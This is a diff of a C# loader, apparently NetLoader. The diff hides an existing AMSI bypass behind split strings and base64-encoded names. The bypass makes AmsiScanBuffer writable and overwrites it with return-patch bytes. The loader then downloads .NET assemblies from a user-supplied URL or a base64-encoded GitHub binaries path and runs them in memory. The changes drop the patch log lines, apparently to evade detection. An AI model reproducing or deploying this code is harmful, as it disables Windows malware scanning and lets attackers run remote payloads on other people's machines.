@@ -12,9 +12,22 @@ using System.Text.RegularExpressions;
 //using Microsoft.Build.Utilities;
 public class TotallyNotNt
 {
-    static WebClient leaveMeAlone = new WebClient() { };
-    static string _repURL = "https://github.com/Flangvik/NetLoader/tree/master/Binaries";
+	[DllImport("ker" +"nel" + "32")]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
+    [DllImport("ker" +"nel" + "32")]
+    private static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("ker" +"nel" + "32")]
+    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+	
+    static WebClient leaveMeAlone = new WebClient() { };
+
+ private static void RiddleMeThis(MethodInfo methodHolder, object[] dataArgs = null ){
+	//methodHolder.Invoke(null, new object[] { new string[] { arguments } });
+	methodHolder.Invoke(0, dataArgs);
+}
+	
     public static void Main(string[] args)
     {
         Console.WriteLine("[!] ~Flangvik  #NetLoader");
@@ -160,52 +173,22 @@ public class TotallyNotNt
     }
 
 
-
-    public static void leaveThisAlone(string binName, string arguments = "", string customUrl = "", bool randomStuff = true)
+    private static MethodInfo testMe(Assembly asm)
     {
+		if(1 == 1)
+			return asm.EntryPoint;
+		
+		return null;
+	}
 
 
-        if (!randomStuff)
-        {
-            if (!customUrl.StartsWith("http"))
-            {
-                testMe(Assembly.Load(File.ReadAllBytes(customUrl)), arguments).Invoke(null, new object[] { new string[] { arguments } });
-
-
-            }
-            else
-            {
-                testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl)), arguments).Invoke(null, new object[] { new string[] { arguments } });
-
-            }
-        }
-        else
-        {
-            testMe(Assembly.Load(leaveMeAlone.DownloadData(_repURL.Replace("tree", "blob") + "/" + binName + "?raw=true")), arguments).Invoke(null, new object[] { new string[] { arguments } });
-        }
-
-
-
-    }
-
-
-    public static MethodInfo testMe(Assembly asm, string args)
-    {
-
-        // Get your point of entry.
-        MethodInfo Ripped = asm.EntryPoint;
-
-        //Invoke point of entry with arguments.
-        //Ripped.
-        return Ripped;
-
-    }
-
-    public static List<string> GetBins()
+	
+	
+    private static List<string> GetBins()
     {
 
         var avBinaries = new List<string>() { };
-        var websiteSource = leaveMeAlone.DownloadString(_repURL);
+        var websiteSource = leaveMeAlone.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")));
 
         Regex rgx = new Regex(@"\/[A-Za-z]{0,50}\.bin", RegexOptions.IgnoreCase);
         foreach (var match in rgx.Matches(websiteSource))
@@ -217,18 +200,18 @@ public class TotallyNotNt
 
     }
 
-    public static void CopyData(byte[] dataStuff, IntPtr intAddr)
+
+
+    private static void CopyData(byte[] dataStuff, IntPtr somePlaceInMem, int holderFoo = 0)
     {
-
-        Marshal.Copy(dataStuff, 0, intAddr, dataStuff.Length);
+        Marshal.Copy(dataStuff, holderFoo, somePlaceInMem, dataStuff.Length);
     }
-
     private static void MoveLifeAhead(bool BigBoy = false)
     {
         try
         {
-            var fooBar = WinLibBase.LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
-            IntPtr addr = WinLibBase.GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
+            var fooBar = LoadLibrary(Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")));
+            IntPtr addr = GetProcAddress(fooBar, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
             uint magicRastaValue = 0x40;
 
             uint someNumber = 0;
@@ -237,28 +220,25 @@ public class TotallyNotNt
             {
                 var bigBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
 
-                Console.WriteLine("[+] Patching...");
 
-                WinLibBase.VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);
+                VirtualProtect(addr, (UIntPtr)bigBoyBytes.Length, magicRastaValue, out someNumber);
 
                 CopyData(bigBoyBytes, addr);
 
-                Console.WriteLine("[+] Patched!");
             }
             else
             {
                 var smallBoyBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
-                Console.WriteLine("[+] Patching ...");
 
-                WinLibBase.VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
+                VirtualProtect(addr, (UIntPtr)smallBoyBytes.Length, magicRastaValue, out someNumber);
 
                 CopyData(smallBoyBytes, addr);
 
-                Console.WriteLine("[+] Patched!");
+
 
             }
-
+                Console.WriteLine("[+] Patched!");
 
         }
         catch (Exception ex)
@@ -267,22 +247,32 @@ public class TotallyNotNt
 
         }
     }
-
+	public static void leaveThisAlone(string binName, string arguments = "", string customUrl = "", bool randomStuff = true)
+    {		var argHolder = new object[] { new string[] { arguments } };
+	
+        if (!randomStuff)
+        {
+            if (!customUrl.StartsWith("http"))
+            {
+                RiddleMeThis(testMe(Assembly.Load(File.ReadAllBytes(customUrl))),argHolder);
+			}
+            else
+            {
+                RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(customUrl))),argHolder);
+			}
+		}	
+        else
+        {
+			RiddleMeThis(testMe(Assembly.Load(leaveMeAlone.DownloadData(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci90cmVlL21hc3Rlci9CaW5hcmllcw==")).Replace("tree", "blob") + "/" + binName + "?raw=true"))),argHolder);
+	    }
+	
+    }
 
 }
 
-public class WinLibBase
-{
 
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+   
 
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-}
 
 /*
  //This is for MSBuild later
